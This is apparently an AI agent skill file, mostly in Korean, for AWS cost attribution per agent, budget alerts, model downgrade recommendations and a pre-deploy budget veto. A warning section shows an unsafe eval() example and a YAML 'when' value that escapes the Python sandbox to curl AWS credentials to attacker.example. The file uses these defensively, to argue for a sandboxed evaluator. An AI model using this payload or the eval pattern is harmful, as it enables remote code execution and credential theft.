---
name: cost-governance
description: AWS Pricing과 Cost Explorer를 MCP로 조회하여 agent별 비용 귀속을 집계하고 예산 alert을 발행하며, 사용 패턴이 정당하면 Opus → Sonnet → Haiku 모델 다운그레이드를 권고한다. 월간 예산 ceiling을 초과할 것으로 예상되는 배포는 veto하여 autopilot-deploy의 pre-flight gate로 작동한다.
argument-hint: "[agent or deployment target]"
user-invocable: true
model: claude-sonnet-4-6
allowed-tools: "Read,Grep,Bash,mcp__cloudwatch,mcp__prometheus"
ontology:
  references: [Budget, Agent, Deployment]
---

## When to Use

- 매일 00:00 UTC cron — 전일 agent별 비용 집계 및 월간 누적 대비 burn rate 확인.
- `autopilot-deploy`의 pre-flight gate — 배포 대상이 예산 ceiling을 초과할 가능성이 있을 때 veto 판정.
- 월간 예산 80% / 95% 도달 alert.
- 토큰 사용 패턴이 평균 대비 2× 초과한 agent에 대한 downgrade 권고 생성.

사용 제외:

- 비용 데이터가 Cost Explorer에 아직 반영되지 않은 구간 (24~48시간 lag 존재).
- 예산 정의(`.omao/plans/cost/budget.yaml`)가 없는 프로젝트 — 먼저 예산 정의 필요.

## Prerequisites

- **awslabs.aws-pricing-mcp-server==1.0.28** — 모델·인스턴스 단가 조회 (`@latest` 금지, PyPI 버전 pin).
- **awslabs.cost-explorer-mcp-server==0.0.21** — 실측 비용·사용량 조회.
- **Cost Allocation Tags** — EKS Pod와 Bedrock 호출에 `agent=<name>`, `env=<prod|stage>` 태그가 부착되어 있어야 함.
- 월간 예산 정의: `.omao/plans/cost/budget.yaml`.
- `autopilot-deploy`의 배포 요청 큐 접근 권한 (veto 게이트 삽입).

예산 정의 예시:

```yaml
# .omao/plans/cost/budget.yaml
monthly_ceiling_usd:
  total: 50000
  per_agent:
    rag-qa-agent: 8000
    code-reviewer-agent: 5000
    incident-triage-agent: 3000
alerts:
  - at_percent: 80
    action: notify
  - at_percent: 95
    action: veto-new-deploys
  - at_percent: 100
    action: freeze-and-escalate
downgrade_recommendations:
  enable: true
  models:
    - from: claude-opus-4-7
      to: claude-sonnet-4-6
      when: "avg_complexity_score < 0.4 for 7 days"
    - from: claude-sonnet-4-6
      to: claude-haiku-4-5
      when: "avg_token_output < 200 and avg_complexity_score < 0.3"
```

## 4-Phase Governance

### Phase 1: Cost Attribution — Agent별 비용 귀속

매일 cron으로 전일 Cost Explorer 데이터를 조회하여 `agent` 태그별로 비용을 집계합니다.

```bash
YESTERDAY=$(date -u -d 'yesterday' +%Y-%m-%d)
TODAY=$(date -u +%Y-%m-%d)

# MCP via awslabs.cost-explorer-mcp-server
# mcp__cost_explorer__get_cost_and_usage \
#   --time-period "Start=$YESTERDAY,End=$TODAY" \
#   --granularity DAILY \
#   --group-by '[{"Type":"TAG","Key":"agent"}]' \
#   --metrics '["UnblendedCost","UsageQuantity"]'

aws ce get-cost-and-usage \
  --time-period Start=$YESTERDAY,End=$TODAY \
  --granularity DAILY \
  --group-by Type=TAG,Key=agent \
  --metrics UnblendedCost UsageQuantity \
  > .omao/plans/cost/daily-${YESTERDAY}.json
```

집계 결과는 `{agent, daily_usd, mtd_usd, projected_monthly_usd}` 구조로 정리합니다.

### Phase 2: Budget Alert — 임계 도달 감지

월간 누적(mtd_usd) vs 월간 예산(monthly_ceiling_usd) 비율을 계산하여 alert를 발행합니다.

```python
import yaml, json
from datetime import datetime

budget = yaml.safe_load(open(".omao/plans/cost/budget.yaml"))
cost = json.load(open(f".omao/plans/cost/daily-{yesterday}.json"))

for agent, data in cost.items():
    ceiling = budget["monthly_ceiling_usd"]["per_agent"].get(agent)
    if not ceiling:
        continue
    pct = (data["mtd_usd"] / ceiling) * 100
    for alert in budget["alerts"]:
        if pct >= alert["at_percent"]:
            emit_alert(agent, pct, alert["action"])
```

- `notify` — Slack/Email 알림만 발송.
- `veto-new-deploys` — `autopilot-deploy`의 pre-flight gate 상태 파일을 `vetoed`로 마킹.
- `freeze-and-escalate` — 모든 신규 배포 freeze + FinOps 팀 호출.

### Phase 3: Model Downgrade Recommendation

Langfuse trace에서 agent별 `avg_complexity_score`, `avg_token_output` 메트릭을 계산하여 downgrade 기회를 탐지합니다.

> **⚠️ 보안 — `rule["when"]` 은 사용자 편집 가능한 `.omao/plans/cost/budget.yaml` 에서 온 문자열입니다. 절대 Python `eval()` / `exec()` 에 넣지 마세요.** `budget.yaml` 을 수정할 수 있는 누구든 임의 코드를 실행할 수 있게 되며 (IAM credential, `/.aws/credentials`, Bedrock 토큰 모두 노출) 이는 RCE 벡터입니다. 반드시 **sandboxed expression evaluator** — [`simpleeval`](https://pypi.org/project/simpleeval/) 또는 [`asteval`](https://newville.github.io/asteval/) — 를 사용해 표현식을 AST 로 파싱하고 산술·비교 연산자, 허용된 이름(`complexity`, `output`) 만 노출합니다.

```python
# pip install simpleeval
from simpleeval import SimpleEval, NameNotDefined, InvalidExpression

def eval_condition(expression: str, **context) -> bool:
    """Evaluate a budget.yaml `when:` expression safely.

    Uses simpleeval's AST-walking sandbox — NO builtins, NO imports, NO attribute
    access, NO function calls except those we explicitly allowlist. Raises on
    unknown names instead of silently returning False.
    """
    evaluator = SimpleEval(names=context, functions={})  # zero callables exposed
    try:
        result = evaluator.eval(expression)
    except (NameNotDefined, InvalidExpression, SyntaxError) as e:
        raise ValueError(f"invalid budget rule {expression!r}: {e}") from e
    return bool(result)


def evaluate_downgrade(agent: str) -> list[dict]:
    traces = fetch_langfuse_traces(agent=agent, days=7)
    complexity = mean([t["complexity_score"] for t in traces])
    output_tokens = mean([t["output_tokens"] for t in traces])

    recs = []
    for rule in budget["downgrade_recommendations"]["models"]:
        if eval_condition(rule["when"], complexity=complexity, output=output_tokens):
            savings = estimate_monthly_savings(agent, rule["from"], rule["to"])
            recs.append({
                "agent": agent,
                "from": rule["from"],
                "to": rule["to"],
                "estimated_monthly_savings_usd": savings,
                "evidence": {"complexity": complexity, "output_tokens": output_tokens},
            })
    return recs
```

### Bad Example — 절대 하지 말 것

```python
# ❌ 절대 금지: budget.yaml 은 사용자 편집 가능 → RCE 벡터.
def eval_condition(expression: str, **context) -> bool:
    return bool(eval(expression, {"__builtins__": {}}, context))  # noqa: S307
```

아래 같은 `budget.yaml` 한 줄로 AWS credential 이 공격자 S3 버킷으로 유출됩니다 (`__builtins__` 를 비워도 우회 가능):

```yaml
downgrade_recommendations:
  models:
    - from: claude-opus-4-7
      to: claude-sonnet-4-6
      when: "().__class__.__bases__[0].__subclasses__()[108].__init__.__globals__['sys'].modules['os'].system('curl https://attacker.example/x -d @$HOME/.aws/credentials')"
```

`eval()` / `exec()` / `compile()` 는 절대 신뢰 경계 밖 문자열에 사용하지 않습니다. 허용 리스트 기반 AST evaluator 만 사용합니다.

권고는 Draft PR로 자동 생성됩니다. 승인은 플랫폼 팀이 직접 수행합니다.

```markdown
## Model Downgrade Recommendation

**Agent**: `code-reviewer-agent`
**Current**: `claude-opus-4-7`
**Recommended**: `claude-sonnet-4-6`

### Evidence (7-day window)
- Average complexity score: 0.32 (threshold < 0.4)
- Average output tokens: 180 (threshold < 200)
- Tool invocation variety: 3/12 available tools actually used

### Estimated Impact
- Monthly savings: $1,840
- Expected quality delta (based on continuous-eval regression test):
  - faithfulness: -0.01 (within noise)
  - answer_relevancy: +0.00

### Verification Plan
1. Shadow test with Sonnet for 48h at 10% traffic
2. `continuous-eval` full run on golden dataset
3. If regression < 2pp, approve full downgrade
```

### Phase 4: Deploy Veto — Pre-flight Gate

`autopilot-deploy`가 새 배포를 시작하기 전에 본 skill에 pre-flight 승인을 요청합니다.

```bash
# autopilot-deploy 호출 시 내부적으로 실행
CURRENT_MTD_PCT=$(jq -r '.total.mtd_pct' .omao/plans/cost/current-month.json)
NEW_DEPLOY_ESTIMATED_COST=$(estimate_deploy_cost "$TARGET" "$VERSION")

if [ "$(echo "$CURRENT_MTD_PCT + $NEW_DEPLOY_ESTIMATED_COST > 95" | bc)" -eq 1 ]; then
    echo '{"decision":"veto","reason":"projected monthly ceiling exceeded"}' \
      > .omao/state/autopilot-deploy/preflight-${TARGET}.json
    exit 1
fi

echo '{"decision":"pass"}' > .omao/state/autopilot-deploy/preflight-${TARGET}.json
```

Veto는 사람이 `.omao/plans/cost/overrides/${target}.yaml` 에 override 사유를 작성하여 해제할 수 있습니다.

## 상태 관리

- `.omao/plans/cost/daily-${date}.json` — 일간 비용 집계
- `.omao/plans/cost/current-month.json` — 월간 누적 (매일 갱신)
- `.omao/plans/cost/alerts/${timestamp}.json` — 발생한 alert 이력
- `.omao/plans/cost/recommendations/${agent}-${date}.md` — Downgrade 권고 PR draft
- `.omao/state/autopilot-deploy/preflight-${target}.json` — Pre-flight gate 결과

## Example Inputs/Outputs

**Input**: `/cost-governance --daily`

**Output**:

```
[00:15Z] Fetching Cost Explorer data for 2026-04-20
[00:16Z] Agents tracked: 7
[00:16Z] MTD summary:
         rag-qa-agent       : $6,430 / $8,000 (80.4%) ALERT: notify
         code-reviewer      : $4,210 / $5,000 (84.2%) ALERT: notify
         incident-triage    : $1,950 / $3,000 (65.0%) ok
         total              : $42,850 / $50,000 (85.7%) ALERT: notify
[00:17Z] Downgrade opportunities:
         code-reviewer-agent: opus → sonnet, est savings $1,840/mo
         → Draft PR created: .omao/plans/cost/recommendations/code-reviewer-20260421.md
[00:18Z] Autopilot pre-flight: veto threshold NOT reached. New deploys allowed.
```

**Input (pre-flight)**: `/cost-governance --preflight rag-qa-agent:v2.3.1`

**Output (veto)**:

```
[11:00Z] Pre-flight cost check for rag-qa-agent:v2.3.1
[11:00Z] Current MTD: $47,500 / $50,000 (95.0%)
[11:00Z] Estimated deploy additional cost: $2,800
[11:00Z] Projected: $50,300 / $50,000 (100.6%)
[11:00Z] Decision: VETO
[11:00Z] Reason: projected monthly ceiling exceeded
[11:00Z] Override path: .omao/plans/cost/overrides/rag-qa-agent.yaml
```

## 참고 자료

### 공식 문서

- [AWS Cost Explorer API](https://docs.aws.amazon.com/aws-cost-management/latest/APIReference/API_Operations_AWS_Cost_Explorer_Service.html) — 비용 조회
- [AWS Cost Allocation Tags](https://docs.aws.amazon.com/awsaccountbilling/latest/aboutv2/cost-alloc-tags.html) — 태그 기반 귀속
- [awslabs/mcp — aws-pricing-mcp-server](https://github.com/awslabs/mcp/tree/main/src/aws-pricing-mcp-server) — 단가 조회 MCP
- [awslabs/mcp — cost-explorer-mcp-server](https://github.com/awslabs/mcp/tree/main/src/cost-explorer-mcp-server) — 실측 비용 MCP
- [Anthropic — Claude 모델 가격](https://www.anthropic.com/pricing) — Opus/Sonnet/Haiku 단가

### 기술 블로그

- [FinOps Foundation — Cloud cost optimization principles](https://www.finops.org/framework/principles/) — 비용 거버넌스 프레임워크
- [AWS — Cost optimization for machine learning workloads](https://docs.aws.amazon.com/wellarchitected/latest/machine-learning-lens/cost-optimization-pillar.html) — ML 비용 최적화

### 관련 문서 (내부)

- [autopilot-deploy skill](../autopilot-deploy/SKILL.md) — 본 skill의 veto를 수신하는 pre-flight gate 소비자
- [continuous-eval skill](../continuous-eval/SKILL.md) — Downgrade 전후 품질 회귀 검증자
- [self-improving-loop skill](../self-improving-loop/SKILL.md) — 비용 이상을 신호로 활용
- [incident-response skill](../incident-response/SKILL.md) — 예산 100% 도달 시 SEV2 escalation 수신자
